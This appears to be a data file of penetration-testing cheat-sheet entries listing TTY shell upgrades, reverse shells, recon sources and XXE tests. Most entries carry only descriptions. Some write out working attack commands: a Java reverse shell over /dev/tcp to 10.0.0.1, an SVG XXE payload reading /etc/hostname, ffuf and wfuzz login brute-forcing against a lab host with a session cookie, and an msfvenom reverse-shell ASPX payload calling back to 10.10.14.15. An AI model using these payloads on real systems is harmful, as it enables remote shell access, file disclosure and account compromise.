commands.Name: Python BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using Python

commands.Name: Python 3 BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using Python 3

commands.Name: Echo BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using echo and os.system

commands.Name: BASH TTY Shell
commands.Description: Directly spawns an interactive BASH TTY shell

commands.Name: Perl BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using Perl

commands.Name: Ruby BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using Ruby

commands.Name: Lua BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using Lua

commands.Name: IRB BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell using IRB

commands.Name: Vi/Vim BASH TTY Shell (Command 1)
commands.Description: Spawns an interactive BASH TTY shell from within Vi/Vim

commands.Name: Vi/Vim BASH TTY Shell (Command 2)
commands.Description: Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell

commands.Name: Nano BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell from within Nano editor

commands.Name: Nmap BASH TTY Shell
commands.Description: Spawns an interactive BASH TTY shell from within Nmap

commands.Name: Bash Reverse Shell
commands.Description: Creates a reverse shell using bash, tested on Ubuntu 10.10

commands.Name: Perl Reverse Shell
commands.Description: A short, feature-free Perl reverse shell connecting to a specified IP and port

commands.Name: Python Reverse Shell
commands.Description: A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port

commands.Name: PHP Reverse Shell
commands.Description: A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed)

commands.Name: Ruby Reverse Shell
commands.Description: A Ruby reverse shell connecting to a specified IP and port

commands.Name: Netcat Reverse Shell
commands.Description: A Netcat reverse shell, requires -e option support

commands.Name: Netcat FIFO Reverse Shell
commands.Description: An alternative Netcat reverse shell using FIFO for systems without -e option

commands.Name: Java Reverse Shell
commands.Description: A Java reverse shell connecting to a specified IP and port (untested)
commands.Command: r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()

commands.Name: Xterm Reverse Shell
commands.Description: An xterm reverse shell connecting to a specified IP on port 6001

commands.Name: Xnest Setup
commands.Description: Starts an X-Server to catch incoming xterm on port 6001 (run on your system)

commands.Name: Xhost Authorization
commands.Description: Authorizes the target to connect to your X-Server (run on your system)

commands.Name: Shodan
commands.Description: Search for company name and variations to look for nonstandard ports and outdated services

commands.Name: GrayHat Warfare
commands.Description: Look for cloud buckets by company names and variations with bucket keywords

commands.Name: XXE
commands.Description: Test for XML External Entity vulnerabilities

commands.Name: XXE with SSRF
commands.Description: Retrieve data from internal EC2 instance using SSRF

commands.Name: XXE Without Full Control
commands.Description: Include XXE in vulnerable field without full document control

commands.Name: XXE Embedded in Image
commands.Description: Embed XXE in an SVG image
commands.Command: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

commands.Name: ffuf Brute
commands.Command: ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u "http://10.10.11.24:8008/ghost/api/admin/session" -X POST -d '{"username":"htbuserFUZZ","password":"secret"}' -H "Host: 10.10.11.24:8008" -H "Accept: text/plain, */*; q=0.01" -H "X-Forwarded-For: htbuserFUZZ" -H "X-Requested-With: XMLHttpRequest" -H "X-Ghost-Version: 5.78" -H "App-Pragma: no-cache" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36" -H "Content-Type: application/json;charset=UTF-8" -H "Origin: http://10.10.11.24:8008" -H "Referer: http://10.10.11.24:8008/ghost/" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en-US,en;q=0.9" -H "Cookie: connect.sid=s%3Av28_oZV8lijLRwlgUQWxt6ccnksDKouo.sb4qxncwYoE0dnj3ARiTb8OnJitRF%2FvDttKjE0nSX%2FM" -H "Connection: close" -mr "There is no user with that email address."

commands.Name: wfuzz Brute
commands.Command: wfuzz -z range,1-100000 -d "username=htbuserFUZZ&password=secret" -H "X-Forwarded-For: htbuserFUZZ" --hs "There is no user with that email address." -u "http://10.10.11.24:8008/ghost/api/admin/session"

commands.Name: msfvenom Windows
commands.Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f aspx -o rshell443.aspx
